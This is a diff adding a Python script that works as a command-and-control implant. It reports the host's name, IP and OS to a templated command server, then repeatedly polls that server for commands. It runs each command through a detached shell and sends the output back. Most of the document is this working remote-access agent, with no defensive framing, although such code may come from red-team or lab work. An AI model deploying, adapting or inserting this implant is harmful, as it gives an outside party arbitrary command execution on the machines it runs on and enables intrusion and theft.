@@ -1,0 +1,67 @@
+import random
+import subprocess
+import requests
+import socket
+import sys
+import time
+
+HOST = '{{ command_server }}'
+
+# Create a connection to a stable ip to get the ip of the interface being used.
+def get_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
+
+# Continually attempt to connect to command server
+def reg_loop(data):
+    while True:
+        time.sleep(5)
+        try:
+            r = requests.get(HOST + "register", json=data, timeout=5)
+        except Exception as e:
+            print(e)
+            continue
+        if r.status_code == 201:
+            break
+
+def main():
+    # Store all the data
+    data = {
+        "name": socket.gethostname(),
+        "ip": get_ip(),
+        "os": sys.platform
+    } 
+    reg_loop(data)
+
+    while True:
+        time.sleep(random.randint(5,10))
+        try:
+            # get the command from the command server
+            r = requests.get(f"{HOST}/api/{data["ip"]}")
+            if r.status_code == 500: # if request errors reregister
+                reg_loop(data)
+                continue
+            if r.text == "": # skip if there is no command queued
+                continue
+            
+            # Spawn process to run shell command
+            result = subprocess.run(f"nohup {r.text} &", shell=True, capture_output=True, text=True, start_new_session=True, timeout=5)
+
+            # report results to command server
+            r = requests.get(f'{HOST}/api/{data["ip"]}/res', data=result.stdout + result.stderr)
+            if r.status_code == 500: # if request errors reregister
+                reg_loop(data)
+        except requests.exceptions.Timeout: # on these errors
+            reg_loop(data)
+        except requests.exceptions.ConnectionError:
+            reg_loop(data)
+        except subprocess.TimeoutExpired:
+            requests.get(f'{HOST}/api/{data["ip"]}/res', data="TIMEOUT")
+        except Exception as e:
+            requests.get(f'{HOST}/api/{data["ip"]}/res', data=str(e))
+
+if __name__ == "__main__":
+    main()
